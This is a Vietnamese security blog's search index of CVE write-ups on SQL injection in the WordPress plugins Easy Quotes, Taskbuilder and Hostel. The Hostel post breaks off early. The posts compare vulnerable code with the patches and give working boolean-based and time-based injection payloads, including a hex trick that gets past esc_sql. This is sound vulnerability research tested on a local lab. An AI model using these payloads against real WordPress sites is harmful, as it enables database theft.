Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query. private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff C√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1) Tuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rTa khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±. get_family_data() l√† h√†m public trong class Quotes_Data class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants Search function H√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress Callback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1 rest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name $family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rTa th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng. True request: True request Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='1'\" ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u003e query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng. False request: False request Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='2'\" ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u003e query kh√¥ng kh·ªõp =\u003e tr·∫£ v·ªÅ []. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w First letter Response tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n l√† w Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+SUBSTRING(DATABASE(),1,1)='w'\" ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u003eprepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. B·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u003eprepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n. Key takeaways: Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Easy Quotes Plugin \u003c= 1.2.2 is vulnerable to SQL Injection ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php Trong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); ·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); B·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection. Patch diff ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rFile architecture: C·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin. Search users üëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress. WPPM_Admin construct: final class WPPM_Admin { // constructor public function __construct() { // other action add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users')); // array($this,'wppm_get_users')) = $this::wppm_get_users() // other action } } add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u003e X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u003e X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin. Ajax search Action wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users() H√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project T·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ Ajax inspect üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥. Model display ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rB·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+SLEEP(1)) Sqli success Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u003e SQL Injection th√†nh c√¥ng. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 S·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói ·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n Res 1 S·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c ' G·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None Res 2 üëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base proj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá. B·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL. Key takeaways: ∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u003eprepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Taskbuilder project mnagement tool Plugin \u003c= 4.0.1 is vulnerable to SQL Injection ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm nh∆∞ng kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp d·ªØ li·ªáu. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings. ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Background\rHostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p: Form ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#background"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploitation\r","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#exploitation"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff 